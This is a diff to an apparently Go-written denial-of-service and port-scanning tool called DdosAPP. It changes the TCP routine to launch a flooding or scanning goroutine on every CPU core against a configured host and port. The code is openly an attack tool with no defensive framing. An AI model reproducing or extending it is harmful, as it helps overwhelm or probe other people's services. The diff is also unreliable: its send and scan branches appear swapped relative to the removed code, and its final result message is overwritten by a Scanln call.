@@ -13,6 +13,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"runtime"
 	"strings"
 	"syscall"
 	"time"
@@ -58,7 +59,6 @@ func (p *DdosAPP) ICMP(config *conf.FlowModel) {
 	} else {
 		p.ScanPacket("ip4:icmp", config.Host)
 	}
-
 }
 
 func (p *DdosAPP) UDP(config *conf.FlowModel) {
@@ -71,19 +71,25 @@ func (p *DdosAPP) UDP(config *conf.FlowModel) {
 }
 
 func (p *DdosAPP) TCP(config *conf.FlowModel) {
+	numCPU := runtime.NumCPU()
+	logrus.Printf("Limit Send mode---CPU：%d", numCPU)
+	var host = fmt.Sprintf("%s:%d", config.Host, config.Port)
 	if config.Scan == 0 {
-		var host = fmt.Sprintf("%s:%d", config.Host, config.Port)
-		p.SendPacket("tcp", host)
+		for i := 0; i < numCPU; i++ {
+			go p.ScanPacket("tcp", config.Host)
+		}
 	} else {
-		p.ScanPacket("tcp", config.Host)
+		for i := 0; i < numCPU; i++ {
+			go p.SendPacket("tcp", host)
+		}
 	}
-
+	result := fmt.Sprintf("stopped sending a total of %d packets", TotalPacket)
+	fmt.Scanln(&result)
 }
 
 func (p *DdosAPP) SendPacket(mode, address string) {
 	// 捕获ctrl+c
 	signal.Notify(Signal, syscall.SIGINT, syscall.SIGTERM)
-	go DDosSpeed()
 	// 发送数据包
 	for {
 		select {
@@ -108,8 +114,6 @@ func (p *DdosAPP) SendPacket(mode, address string) {
 func (p *DdosAPP) ScanPacket(mode, host string) {
 	// 捕获ctrl+c
 	signal.Notify(Signal, syscall.SIGINT, syscall.SIGTERM)
-	go DDosSpeed()
-
 	// 发送数据包
 	for {
 		select {
@@ -123,7 +127,6 @@ func (p *DdosAPP) ScanPacket(mode, host string) {
 				var address = fmt.Sprintf("%s:%d", host, ScanPort)
 				conn, err := net.DialTimeout(mode, address, time.Millisecond*300)
 				TemporaryPacket += 1
-
 				if err != nil {
 					break
 				}
